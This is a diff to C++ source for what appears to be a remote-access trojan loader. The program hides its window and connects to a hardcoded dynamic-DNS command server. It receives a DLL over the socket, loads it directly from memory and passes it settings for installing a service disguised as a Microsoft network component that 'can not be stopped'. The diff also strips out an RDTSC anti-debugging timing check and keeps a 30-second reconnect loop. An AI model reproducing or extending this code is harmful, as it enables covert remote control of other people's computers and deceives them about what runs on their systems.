@@ -9,6 +9,30 @@
 
 #include "MemLoadDll.h"
 
+struct MODIFY_DATA
+{
+	char  strIPFile[128];   //ip文件or DNS						0
+	char  strVersion[16];   //服务端版本							128
+	DWORD dwVipID;          //VIP ID							144
+	BOOL  bReplace;         //TRUE-替换服务，FALSE-新建服务		148
+	char  strSvrName[32];   //服务名称							149
+	char  strSvrDisp[100];  //服务显示							181
+	char  strSvrDesc[100];  //服务描述							281
+	char  ServerAddr[100];	//Client Addr						381
+	int   ServerPort;		//Client port						481
+} modify_data =
+{
+	"lkyfire.vicp.net:80",
+	"20170507",
+	405,
+	FALSE,
+	"WinNetCenter",
+	"Microsoft(R) Multi Protocol Network Control Center",
+	"Provides supports for multi network Protocol. This service can not be stopped.",
+	"127.0.0.1", //lkyfire.vicp.net
+	80
+};
+
 unsigned long _stdcall resolve(char *host)
 {
 	long i = inet_addr(host);
@@ -33,30 +57,6 @@ unsigned long _stdcall resolve(char *host)
 	return i;
 }
 
-struct MODIFY_DATA
-{
-	char  strIPFile[128];   //ip文件or DNS						0
-	char  strVersion[16];   //服务端版本							128
-	DWORD dwVipID;          //VIP ID							144
-	BOOL  bReplace;         //TRUE-替换服务，FALSE-新建服务		148
-	char  strSvrName[32];   //服务名称							149
-	char  strSvrDisp[100];  //服务显示							181
-	char  strSvrDesc[100];  //服务描述							281
-	char  ServerAddr[100];	//Client Addr						381
-	int   ServerPort;		//Client port						481
-} modify_data =
-{
-	"lkyfire.vicp.net:80",
-	"20151020",
-	405,
-	FALSE,
-	"WinNetCenter",
-	"Microsoft(R) Multi Protocol Network Control Center",
-	"Provides supports for multi network Protocol. This service can not be stopped.",
-	"lkyfire.vicp.net",
-	80
-};
-
 DWORD _stdcall ConnectThread(LPVOID lParam)
 {
 	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
@@ -71,15 +71,11 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 	if (connect(MainSocket, (PSOCKADDR)&LocalAddr, sizeof(LocalAddr)) == SOCKET_ERROR)
 	{
 		MsgErr("Can't Connect to Dll Server");
-#ifndef DE
-		Sleep(30000);
-#endif
-		return 0;//connect error
+
+		return 0; //connect error
 	}
-	else
-	{
-		TurnonKeepAlive(MainSocket, 120);
-	}
+
+	TurnonKeepAlive(MainSocket, 60);
 
 	MsgHead msgHead;
 	msgHead.dwCmd = SOCKET_DLLLOADER;
@@ -88,13 +84,17 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 	if (!SendMsg(MainSocket, NULL, &msgHead))
 	{
 		MsgErr("Loader Request Can't Send");
+		shutdown(MainSocket, 0x02);
 		closesocket(MainSocket);
+
 		return 1;
 	}
 
 	if (!RecvData(MainSocket, (char*)&msgHead, sizeof(MsgHead)))
 	{
 		MsgErr("Can't Recv Dll Data Head");
+		shutdown(MainSocket, 0x02);
+		closesocket(MainSocket);
 
 		return 1;
 	}
@@ -104,6 +104,9 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 	if (!RecvData(MainSocket, buf, msgHead.dwSize))
 	{
 		MsgErr("Can't Recv Dll Data");
+		VirtualFree(buf, msgHead.dwSize);
+		shutdown(MainSocket, 0x02);
+		closesocket(MainSocket);
 
 		return 1;
 	}
@@ -111,7 +114,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 	shutdown(MainSocket, 0x02);
 	closesocket(MainSocket);
 
-	int Err;
+	DWORD iRet, Err;
 
 	if (msgHead.dwCmd == CMD_DLLDATA)
 	{
@@ -125,19 +128,20 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 			return 2;
 		}
 
-		typedef BOOL(*_RoutineMain)(LPVOID lp);
+		typedef DWORD (*_RoutineMain)(LPVOID lp);
 
 		_RoutineMain RoutineMain = (_RoutineMain)MemoryGetProcAddress(hModule, "RoutineMain");
-		Err = RoutineMain((LPVOID)&modify_data);
+		iRet = RoutineMain((LPVOID)&modify_data);
 		MemoryFreeLibrary(hModule);
 	}
 	else
 	{
+		MsgErr("Received dll incorrect");
 		VirtualFree(buf, msgHead.dwSize);
-		return 2; //Recv Msg is not a dll info
+		return 2;
 	}
 
-	return Err;
+	return iRet;
 }
 
 int APIENTRY WinMain(HINSTANCE hInstance,
@@ -162,20 +166,6 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 	ShowWindow(hwnd, SW_HIDE);
 	UpdateWindow(hwnd);
 
-	_asm
-	{
-		RDTSC
-		xchg    ecx, eax
-		RDTSC
-		sub     eax, ecx
-		cmp     eax, 0FFh
-		jl      OK
-		xor     eax, eax
-		push    eax
-		call    ExitProcess
-	}
-OK:
-
 	GetInputState();
 	PostThreadMessage(GetCurrentThreadId(), NULL, 0, 0);
 
@@ -186,9 +176,9 @@ OK:
 	{
 		__try
 		{
-			if (ConnectThread(NULL) == -1)
+			if (ConnectThread(NULL) == STATE_EXIT)
 			{
-				MsgErr("exiting");
+				Dbp("Exit Request to loader");
 				break;
 			}
 		}
@@ -196,6 +186,10 @@ OK:
 		{
 			MsgErr("ConnectThread Exception");
 		}
+
+#ifdef NDEBUG
+		Sleep(30000);
+#endif
 	}
 
 	WSACleanup();
